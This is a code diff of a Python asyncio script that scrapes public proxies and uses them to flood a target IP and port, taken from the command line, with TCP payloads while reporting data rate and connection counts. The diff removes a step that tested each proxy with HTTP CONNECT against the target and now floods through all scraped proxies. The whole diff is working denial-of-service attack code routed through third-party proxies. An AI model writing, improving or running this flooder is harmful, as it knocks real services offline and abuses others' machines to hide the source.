@@ -21,7 +21,6 @@ PAYLOAD = b'x' * PAYLOAD_SIZE
 
 bytes_sent = connections = errors = 0
 lock = asyncio.Lock()
-VALID_PROXIES = []
 
 def scrape_proxies():
     proxies = []
@@ -38,45 +37,6 @@ def scrape_proxies():
     print(f"[SCRAPE] Total unique: {len(proxies)}", flush=True)
     return proxies
 
-async def check_proxy(proxy_str, target_ip, target_port, timeout=3):
-    try:
-        ip, port = proxy_str.split(":")
-        loop = asyncio.get_running_loop()
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.setblocking(False)
-        s.settimeout(timeout)
-        await asyncio.wait_for(loop.sock_connect(s, (ip, int(port))), timeout=timeout)
-        req = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
-        await asyncio.wait_for(loop.sock_sendall(s, req.encode()), timeout=timeout)
-        resp = await asyncio.wait_for(loop.sock_recv(s, 256), timeout=timeout)
-        s.close()
-        return proxy_str if resp.startswith(b"HTTP/1.1 200") else None
-    except:
-        return None
-
-async def check_all_proxies(proxies, target_ip, target_port):
-    valid = []; total = len(proxies); checked = 0; start = time.time()
-    sem = asyncio.Semaphore(100)
-
-    async def check_one(p):
-        nonlocal checked
-        async with sem:
-            ok = await check_proxy(p, target_ip, target_port)
-        checked += 1
-        if checked % 25 == 0 or checked == total:
-            e = time.time()-start; pct=checked/total*100; rate=checked/max(e,0.1)
-            eta=(total-checked)/max(rate,1)
-            bar="█"*int(pct//5)+"░"*(20-int(pct//5))
-            print(f"\r[CHECK] |{bar}| {pct:.0f}% {len(valid)}v {checked}/{total} {rate:.0f}/s ETA{eta:.0f}s", end="", flush=True)
-        return ok
-
-    print(f"[CHECK] {total} proxies, 100 concurrent...", flush=True)
-    tasks = [asyncio.create_task(check_one(p)) for p in proxies]
-    results = await asyncio.gather(*tasks)
-    for r in results:
-        if r: valid.append(r)
-    print()
-    return valid
 
 async def flood_proxy(stop, proxy_list):
     global bytes_sent, connections, errors
@@ -129,10 +89,10 @@ async def monitor(stop, start, tasks):
         er = e/max(c+e,1)*100
         alive = sum(1 for t in tasks if not t.done())
         print(f"\r[T{elapsed:.0f}s] DATA:{b/1_000_000:.1f}MB RATE:{mbps:.0f}Mbps "
-              f"CONN:{c} ERR:{e}({er:.1f}%) TASKS:{alive} PROXIES:{len(VALID_PROXIES)}", end="", flush=True)
+              f"CONN:{c} ERR:{e}({er:.1f}%) TASKS:{alive}", end="", flush=True)
 
 async def main_async():
-    global TASK_COUNT, TEST_DURATION, TARGET_IP, TARGET_PORT, VALID_PROXIES
+    global TASK_COUNT, TEST_DURATION, TARGET_IP, TARGET_PORT
 
     if len(sys.argv) >= 3:
         TARGET_IP = sys.argv[1]; TARGET_PORT = int(sys.argv[2])
@@ -142,20 +102,14 @@ async def main_async():
         TEST_DURATION = int(sys.argv[4])
 
     print(f"[FLOOD] {TASK_COUNT}tasks x{PAYLOAD_SIZE}B -> {TARGET_IP}:{TARGET_PORT} {TEST_DURATION}s", flush=True)
-    print("[1/3] Scraping proxies...", flush=True)
+    print("[1/2] Scraping proxies...", flush=True)
     proxies = scrape_proxies()
     if not proxies:
         print("[FAIL] No proxies scraped", flush=True); return
 
-    print("[2/3] Checking proxies against target...", flush=True)
-    VALID_PROXIES = await check_all_proxies(proxies, TARGET_IP, TARGET_PORT)
-    if not VALID_PROXIES:
-        print("[FAIL] No working proxies found", flush=True); return
-    print(f"[OK] {len(VALID_PROXIES)} working proxies", flush=True)
-
-    print("[3/3] Starting flood...", flush=True)
+    print(f"[2/2] Starting flood with {len(proxies)} proxies...", flush=True)
     stop = asyncio.Event()
-    tasks = [asyncio.create_task(flood_proxy(stop, VALID_PROXIES)) for _ in range(TASK_COUNT)]
+    tasks = [asyncio.create_task(flood_proxy(stop, proxies)) for _ in range(TASK_COUNT)]
     start = time.time()
     mon = asyncio.create_task(monitor(stop, start, tasks))
     await asyncio.gather(*tasks, return_exceptions=True)
